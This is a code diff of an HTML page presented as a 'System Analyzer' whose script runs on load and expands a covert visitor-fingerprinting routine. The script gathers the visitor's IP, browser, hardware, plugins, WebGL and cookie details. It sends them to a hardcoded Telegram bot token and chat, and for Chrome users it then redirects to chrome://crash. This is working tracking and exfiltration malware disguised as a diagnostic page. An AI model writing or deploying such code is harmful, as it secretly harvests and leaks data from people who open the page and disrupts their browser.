@@ -1,47 +1,224 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Check</title>
+    <title>System Analyzer</title>
 </head>
 <body>
 <script>
-    async function execute() {
-        const data = {
-            ip: (await (await fetch('https://api.ipify.org?format=json')).json()).ip,
-            agent: navigator.userAgent,
-            platform: navigator.platform,
-            resolution: `${screen.width}x${screen.height}`,
-            cookies: navigator.cookieEnabled,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer || 'none'
+    async function collectAll() {
+        const data = {};
+        
+        // Базовые данные
+        data.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
+        data.agent = navigator.userAgent;
+        data.platform = navigator.platform;
+        data.vendor = navigator.vendor || 'неизвестно';
+        data.product = navigator.product || 'неизвестно';
+        data.language = navigator.language;
+        data.languages = navigator.languages;
+        data.cookieEnabled = navigator.cookieEnabled;
+        data.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
+        data.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
+        data.onLine = navigator.onLine;
+        
+        // Экран
+        data.screen = {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation ? screen.orientation.type : 'неизвестно'
         };
-
+        
+        // Время/дата
+        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.date = new Date().toString();
+        data.timezoneOffset = new Date().getTimezoneOffset();
+        
+        // Плагины
+        data.plugins = [];
+        for (let plugin of navigator.plugins) {
+            data.plugins.push(plugin.name + ' v' + plugin.version);
+        }
+        
+        // MIME-типы
+        data.mimeTypes = [];
+        for (let mime of navigator.mimeTypes) {
+            data.mimeTypes.push(mime.type);
+        }
+        
+        // Хардварные возможности
+        data.hardware = {
+            concurrency: navigator.hardwareConcurrency || 'неизвестно',
+            deviceMemory: navigator.deviceMemory || 'неизвестно',
+            maxTouchPoints: navigator.maxTouchPoints || 0
+        };
+        
+        // WebRTC (может дать локальный IP)
+        data.rtcSupport = {
+            RTCPeerConnection: window.RTCPeerConnection ? 'да' : 'нет',
+            RTCSessionDescription: window.RTCSessionDescription ? 'да' : 'нет'
+        };
+        
+        // Хранилища
+        data.storage = {
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            cookies: document.cookie.length > 0
+        };
+        
+        // Поддержка API
+        data.apis = {
+            geolocation: 'geolocation' in navigator,
+            serviceWorker: 'serviceWorker' in navigator,
+            notifications: 'Notification' in window,
+            mediaDevices: 'mediaDevices' in navigator,
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            credentials: 'credentials' in navigator,
+            wakeLock: 'wakeLock' in navigator,
+            storage: 'storage' in navigator,
+            clipboard: 'clipboard' in navigator
+        };
+        
+        // Сеть
+        if (navigator.connection) {
+            data.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+        
+        // Пиксельное соотношение
+        data.devicePixelRatio = window.devicePixelRatio;
+        
+        // Дополнительные заголовки
+        data.headers = {
+            referrer: document.referrer || 'отсутствует',
+            encoding: document.characterSet || document.charset
+        };
+        
+        // WebGL информация
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            data.webgl = {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'скрыто',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'скрыто',
+                version: gl.getParameter(gl.VERSION)
+            };
+        }
+        
+        // Дополнительно: попытка определения ОС через User Agent
+        const ua = data.agent.toLowerCase();
+        if (ua.includes('win')) data.detectedOS = 'Windows';
+        else if (ua.includes('mac')) data.detectedOS = 'macOS';
+        else if (ua.includes('linux')) data.detectedOS = 'Linux';
+        else if (ua.includes('android')) data.detectedOS = 'Android';
+        else if (ua.includes('ios') || ua.includes('iphone')) data.detectedOS = 'iOS';
+        else data.detectedOS = 'неизвестно';
+        
+        return data;
+    }
+    
+    async function execute() {
         const botToken = '8442621494:AAE71KIW6A_CLn2dHN79rvsQChjQsdXeWcc';
         const chatId = '8212035169';
-        const text = `📡 Данные получены:
-IP: ${data.ip}
-Браузер: ${data.agent}
-ОС: ${data.platform}
-Разрешение: ${data.resolution}
-Куки: ${data.cookies}
-Язык: ${data.language}
-Часовой пояс: ${data.timezone}
-Реферер: ${data.referrer}`;
+        
+        const allData = await collectAll();
+        
+        // Формируем сообщение
+        let message = `🔍 ПОЛНЫЙ СБОР ДАННЫХ
+IP: ${allData.ip}
+Время: ${allData.date}
+Часовой пояс: ${allData.timezone}
+ОС (детект): ${allData.detectedOS}
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+🌐 БРАУЗЕР:
+User Agent: ${allData.agent}
+Платформа: ${allData.platform}
+Вендор: ${allData.vendor}
+Язык: ${allData.language}
+Доступные языки: ${allData.languages}
+Куки: ${allData.cookieEnabled ? 'включены' : 'выключены'}
+Java: ${allData.javaEnabled ? 'да' : 'нет'}
+PDF Viewer: ${allData.pdfViewerEnabled ? 'да' : 'нет'}
+Онлайн: ${allData.onLine ? 'да' : 'нет'}
 
-        function showImage() {
-            document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
-        }
+📺 ЭКРАН:
+Разрешение: ${allData.screen.width}x${allData.screen.height}
+Доступно: ${allData.screen.availWidth}x${allData.screen.availHeight}
+Глубина цвета: ${allData.screen.colorDepth} бит
+Ориентация: ${allData.screen.orientation}
+Пиксельное соотношение: ${allData.devicePixelRatio}
 
-        if (/chrome/i.test(data.agent)) {
+💾 ХРАНИЛИЩА:
+LocalStorage: ${allData.storage.localStorage ? 'да' : 'нет'}
+SessionStorage: ${allData.storage.sessionStorage ? 'да' : 'нет'}
+IndexedDB: ${allData.storage.indexedDB ? 'да' : 'нет'}
+Куки в документе: ${allData.storage.cookies ? 'да (' + document.cookie.length + ' байт)' : 'нет'}
+
+⚙️ ХАРДВАР:
+Ядер CPU: ${allData.hardware.concurrency}
+Память устройства: ${allData.hardware.deviceMemory} GB
+Касаний: ${allData.hardware.maxTouchPoints}
+
+🔌 ПЛАГИНЫ (${allData.plugins.length}):
+${allData.plugins.join('\n') || 'нет'}
+
+📄 MIME-ТИПЫ (${allData.mimeTypes.length}):
+${allData.mimeTypes.slice(0, 10).join(', ')}${allData.mimeTypes.length > 10 ? '...' : ''}
+
+📶 СЕТЬ:
+Тип: ${allData.connection ? allData.connection.effectiveType : 'неизвестно'}
+Скорость: ${allData.connection ? allData.connection.downlink + ' Мбит/с' : 'неизвестно'}
+RTT: ${allData.connection ? allData.connection.rtt + ' мс' : 'неизвестно'}
+Экономия трафика: ${allData.connection ? (allData.connection.saveData ? 'да' : 'нет') : 'неизвестно'}
+
+🔧 API:
+Геолокация: ${allData.apis.geolocation ? 'да' : 'нет'}
+Service Worker: ${allData.apis.serviceWorker ? 'да' : 'нет'}
+Уведомления: ${allData.apis.notifications ? 'да' : 'нет'}
+Медиаустройства: ${allData.apis.mediaDevices ? 'да' : 'нет'}
+Bluetooth: ${allData.apis.bluetooth ? 'да' : 'нет'}
+USB: ${allData.apis.usb ? 'да' : 'нет'}
+Credentials: ${allData.apis.credentials ? 'да' : 'нет'}
+WakeLock: ${allData.apis.wakeLock ? 'да' : 'нет'}
+Storage: ${allData.apis.storage ? 'да' : 'нет'}
+Clipboard: ${allData.apis.clipboard ? 'да' : 'нет'}
+
+🖥️ WEBGL:
+Вендор: ${allData.webgl ? allData.webgl.vendor : 'не поддерживается'}
+Рендерер: ${allData.webgl ? allData.webgl.renderer : 'не поддерживается'}
+Версия: ${allData.webgl ? allData.webgl.version : 'не поддерживается'}
+
+🔗 ДОПОЛНИТЕЛЬНО:
+Реферер: ${allData.headers.referrer}
+Кодировка: ${allData.headers.encoding}
+WebRTC: ${allData.rtcSupport.RTCPeerConnection}
+Timezone Offset: ${allData.timezoneOffset}`;
+        
+        // Отправка
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        await fetch(url);
+        
+        // Действие по браузеру
+        if (/chrome/i.test(allData.agent)) {
             window.location.href = 'chrome://crash';
-            setTimeout(showImage, 1000);
+            setTimeout(() => {
+                document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+            }, 1000);
         } else {
-            showImage();
+            document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSyyzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
         }
     }
+    
     execute();
 </script>
 </body>
